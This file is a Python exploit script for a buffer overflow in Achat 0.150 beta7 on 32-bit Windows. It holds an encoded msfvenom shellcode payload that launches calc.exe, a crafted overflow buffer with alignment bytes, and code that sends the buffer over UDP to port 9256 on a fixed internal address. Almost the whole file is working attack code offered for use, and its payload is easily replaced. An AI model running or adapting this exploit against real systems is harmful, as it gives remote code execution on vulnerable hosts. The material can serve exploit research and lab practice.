#!/usr/bin/python
# Author KAhara MAnhara
# Achat 0.150 beta7 - Buffer Overflow
# Tested on Windows 7 32bit

import socket
import sys, time

# msfvenom -a x86 --platform Windows -p windows/exec CMD=calc.exe -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
#Payload size: 512 bytes

buf =  b""
buf += b"\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49"
buf += b"\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += b"\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51\x41\x44\x41"
buf += b"\x5a\x41\x42\x41\x52\x41\x4c\x41\x59\x41\x49\x41\x51"
buf += b"\x41\x49\x41\x51\x41\x49\x41\x68\x41\x41\x41\x5a\x31"
buf += b"\x41\x49\x41\x49\x41\x4a\x31\x31\x41\x49\x41\x49\x41"
buf += b"\x42\x41\x42\x41\x42\x51\x49\x31\x41\x49\x51\x49\x41"
buf += b"\x49\x51\x49\x31\x31\x31\x41\x49\x41\x4a\x51\x59\x41"
buf += b"\x5a\x42\x41\x42\x41\x42\x41\x42\x41\x42\x6b\x4d\x41"
buf += b"\x47\x42\x39\x75\x34\x4a\x42\x69\x6c\x67\x78\x34\x42"
buf += b"\x39\x70\x69\x70\x49\x70\x51\x50\x74\x49\x4b\x35\x30"
buf += b"\x31\x67\x50\x73\x34\x52\x6b\x32\x30\x4e\x50\x64\x4b"
buf += b"\x32\x32\x4c\x4c\x42\x6b\x31\x42\x4a\x74\x44\x4b\x31"
buf += b"\x62\x4c\x68\x7a\x6f\x74\x77\x4d\x7a\x6f\x36\x70\x31"
buf += b"\x79\x6f\x76\x4c\x4f\x4c\x53\x31\x51\x6c\x5a\x62\x6e"
buf += b"\x4c\x4b\x70\x76\x61\x58\x4f\x6c\x4d\x79\x71\x47\x57"
buf += b"\x47\x72\x4a\x52\x62\x32\x70\x57\x72\x6b\x32\x32\x4c"
buf += b"\x50\x32\x6b\x50\x4a\x6f\x4c\x74\x4b\x70\x4c\x6a\x71"
buf += b"\x34\x38\x68\x63\x6e\x68\x7a\x61\x6a\x31\x50\x51\x52"
buf += b"\x6b\x61\x49\x4b\x70\x4d\x31\x7a\x33\x72\x6b\x4d\x79"
buf += b"\x4e\x38\x5a\x43\x4f\x4a\x50\x49\x32\x6b\x6c\x74\x34"
buf += b"\x4b\x6d\x31\x46\x76\x6d\x61\x6b\x4f\x64\x6c\x65\x71"
buf += b"\x68\x4f\x6a\x6d\x79\x71\x39\x37\x4d\x68\x77\x70\x42"
buf += b"\x55\x38\x76\x6d\x33\x53\x4d\x39\x68\x6f\x4b\x43\x4d"
buf += b"\x4c\x64\x63\x45\x6b\x34\x72\x38\x74\x4b\x62\x38\x6e"
buf += b"\x44\x79\x71\x36\x73\x70\x66\x32\x6b\x7a\x6c\x50\x4b"
buf += b"\x44\x4b\x50\x58\x6b\x6c\x69\x71\x7a\x33\x42\x6b\x6d"
buf += b"\x34\x52\x6b\x6b\x51\x36\x70\x74\x49\x4d\x74\x4c\x64"
buf += b"\x6e\x44\x4f\x6b\x6f\x6b\x53\x31\x32\x39\x51\x4a\x62"
buf += b"\x31\x49\x6f\x6b\x30\x61\x4f\x4f\x6f\x6e\x7a\x62\x6b"
buf += b"\x4b\x62\x58\x6b\x44\x4d\x4f\x6d\x51\x58\x70\x33\x6c"
buf += b"\x72\x6d\x30\x39\x70\x52\x48\x53\x47\x31\x63\x4f\x42"
buf += b"\x61\x4f\x62\x34\x51\x58\x70\x4c\x54\x37\x6d\x56\x5a"
buf += b"\x67\x6b\x4f\x39\x45\x48\x38\x52\x70\x4b\x51\x59\x70"
buf += b"\x6b\x50\x6b\x79\x68\x44\x50\x54\x52\x30\x62\x48\x4f"
buf += b"\x39\x65\x30\x50\x6b\x79\x70\x4b\x4f\x79\x45\x4e\x70"
buf += b"\x4e\x70\x30\x50\x30\x50\x61\x30\x30\x50\x4f\x50\x72"
buf += b"\x30\x42\x48\x37\x7a\x4c\x4f\x79\x4f\x69\x50\x49\x6f"
buf += b"\x37\x65\x35\x47\x70\x6a\x49\x75\x43\x38\x7a\x6a\x59"
buf += b"\x7a\x4c\x4e\x6b\x6d\x52\x48\x69\x72\x59\x70\x4a\x61"
buf += b"\x35\x6b\x33\x59\x4b\x36\x50\x6a\x4e\x30\x31\x46\x6f"
buf += b"\x67\x71\x58\x34\x59\x46\x45\x62\x54\x71\x51\x49\x6f"
buf += b"\x56\x75\x71\x75\x55\x70\x44\x34\x5a\x6c\x49\x6f\x50"
buf += b"\x4e\x5a\x68\x74\x35\x7a\x4c\x63\x38\x4c\x30\x66\x55"
buf += b"\x35\x52\x4e\x76\x6b\x4f\x39\x45\x62\x48\x61\x53\x42"
buf += b"\x4d\x62\x44\x6d\x30\x42\x69\x78\x63\x50\x57\x4f\x67"
buf += b"\x4e\x77\x70\x31\x6c\x36\x31\x5a\x5a\x72\x51\x49\x32"
buf += b"\x36\x39\x52\x69\x6d\x33\x36\x49\x37\x31\x34\x6c\x64"
buf += b"\x4d\x6c\x7a\x61\x6d\x31\x64\x4d\x71\x34\x4f\x34\x4a"
buf += b"\x70\x59\x36\x4d\x30\x50\x44\x71\x44\x72\x30\x31\x46"
buf += b"\x70\x56\x71\x46\x50\x46\x4f\x66\x30\x4e\x70\x56\x70"
buf += b"\x56\x52\x33\x30\x56\x52\x48\x63\x49\x66\x6c\x6d\x6f"
buf += b"\x32\x66\x4b\x4f\x67\x65\x63\x59\x47\x70\x70\x4e\x4f"
buf += b"\x66\x31\x36\x6b\x4f\x4c\x70\x6f\x78\x4d\x38\x52\x67"
buf += b"\x6b\x6d\x43\x30\x6b\x4f\x36\x75\x77\x4b\x58\x70\x46"
buf += b"\x55\x67\x32\x30\x56\x42\x48\x44\x66\x75\x45\x67\x4d"
buf += b"\x63\x6d\x59\x6f\x37\x65\x4f\x4c\x6b\x56\x71\x6c\x59"
buf += b"\x7a\x31\x70\x49\x6b\x59\x50\x53\x45\x6a\x65\x35\x6b"
buf += b"\x51\x37\x4c\x53\x51\x62\x62\x4f\x30\x6a\x4d\x30\x70"
buf += b"\x53\x69\x6f\x46\x75\x41\x41"



# Create a UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
server_address = ('10.10.10.74', 9256)

fs = "\x55\x2A\x55\x6E\x58\x6E\x05\x14\x11\x6E\x2D\x13\x11\x6E\x50\x6E\x58\x43\x59\x39"
p  = "A0000000002#Main" + "\x00" + "Z"*114688 + "\x00" + "A"*10 + "\x00"
p += "A0000000002#Main" + "\x00" + "A"*57288 + "AAAAASI"*50 + "A"*(3750-46)
p += "\x62" + "A"*45
p += "\x61\x40"
p += "\x2A\x46"
p += "\x43\x55\x6E\x58\x6E\x2A\x2A\x05\x14\x11\x43\x2d\x13\x11\x43\x50\x43\x5D" + "C"*9 + "\x60\x43"
p += "\x61\x43" + "\x2A\x46"
p += "\x2A" + fs + "C" * (157-len(fs)- 31-3)
p += buf + "A" * (1152 - len(buf))
p += "\x00" + "A"*10 + "\x00"

print "---->{P00F}!"
i=0
while i<len(p):
    if i > 172000:
        time.sleep(1.0)
    sent = sock.sendto(p[i:(i+8192)], server_address)
    i += sent
sock.close()